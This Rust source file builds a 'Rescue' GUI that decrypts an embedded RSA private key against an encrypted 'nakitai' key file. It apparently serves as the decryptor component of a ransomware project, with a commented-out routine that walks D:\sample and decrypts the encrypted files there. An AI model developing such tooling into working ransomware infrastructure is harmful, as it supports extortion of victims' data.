mod utils;

use base64::decode;
use druid::piet::util::line_number_for_position;
use druid::piet::InterpolationMode;
use druid::widget::{Button, FillStrat, Image, SizedBox};
use druid::{
    widget::{Flex, Label, TextBox},
    AppLauncher, Color, Data, Env, ImageBuf, Lens, LocalizedString, Menu, Widget, WidgetExt,
    WindowDesc, WindowId,
};
use openssl::rsa::Rsa;
use std::sync::Arc;
use std::{fs::File, io::Read};
use utils::{crypto, traverse};

const WINDOW_TITLE: LocalizedString<AppState> = LocalizedString::new("Rescue ( •̀ᴗ•́)و ̑̑");

#[derive(Clone, Data, Lens)]
struct AppState {
    private_key_encoded_str: Arc<String>,
}

fn build_root_ui() -> impl Widget<AppState> {
    let png_data_raw = include_bytes!("./assets/top.png");
    let png_data = ImageBuf::from_data(png_data_raw).unwrap();
    let mut img = Image::new(png_data).fill_mode(FillStrat::Cover);
    img.set_interpolation_mode(InterpolationMode::Bilinear);

    let mut sized_img = SizedBox::new(img);
    sized_img = sized_img.fix_width(500 as f64);
    sized_img = sized_img.fix_height(200 as f64);

    let image_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(sized_img, 1.0);

    let label_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(
            Label::new("Paste your private key in base64 format")
                .with_line_break_mode(druid::widget::LineBreaking::WordWrap),
        );

    let button = Button::new("Recover")
        .on_click(|_ctx, data, _env| println!("click"));

    let textbox_wrap = Flex::row()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_flex_child(
            TextBox::multiline()
                .with_placeholder("Paste here")
                .lens(AppState::private_key_encoded_str)
                .expand_width(),
            1.0,
        )
        .with_child(button);

    /*return Flex::column()
    .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
    .with_child(label_wrap)
    .with_spacer(8.0)
    .with_child(
        Flex::row()
            .with_flex_child(Flex::column().with_child(Label::new("Hola").expand_width()), 1.0)
            .with_child(Flex::column().with_child(button)),
    );*/

    Flex::column()
        .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
        .with_child(image_wrap)
        .with_flex_child(
            Flex::column()
                .cross_axis_alignment(druid::widget::CrossAxisAlignment::Start)
                .with_child(label_wrap)
                .with_spacer(8.0)
                .with_child(textbox_wrap)
                //.with_child(textbox_wrap)
                .padding(8.0),
            1.0,
        )
}

fn main() -> Result<(), anyhow::Error> {
    let og_private_key_b = include_bytes!("../private.pem");
    let og_private_key = Rsa::private_key_from_pem(&og_private_key_b.as_slice())?;

    let mut encrypted_nakitai_key_encoded_buffer = Vec::new();
    let mut encoded_nakitai_key_file = File::open("D:\\sample\\decrypt_key.nky")?;

    encoded_nakitai_key_file.read_to_end(&mut encrypted_nakitai_key_encoded_buffer)?;

    let encrypted_nakitai_key = decode(&encrypted_nakitai_key_encoded_buffer)?;

    let private_key = crypto::decrypt_private_key(256, &og_private_key, &encrypted_nakitai_key)?;

    let main_window = WindowDesc::new(build_root_ui())
        .title(WINDOW_TITLE)
        .resizable(false)
        .window_size((500., 315.));

    // create the initial app state
    let state = AppState {
        private_key_encoded_str: "".to_string().into(),
    };

    // start the application
    AppLauncher::with_window(main_window)
        .log_to_console()
        .launch(state)
        .expect("Failed to launch application");

    /*traverse::find_encrypted_files("D:\\sample", |entry, _| {
        let file_path = entry.path().display().to_string();
        match crypto::decrypt_file(&file_path, 256, &private_key) {
            Ok(_) => {}
            Err(err) => {
                println!("err!!! => [{:?}] {:?}", file_path, err)
            }
        }
    });*/

    Ok(())
}
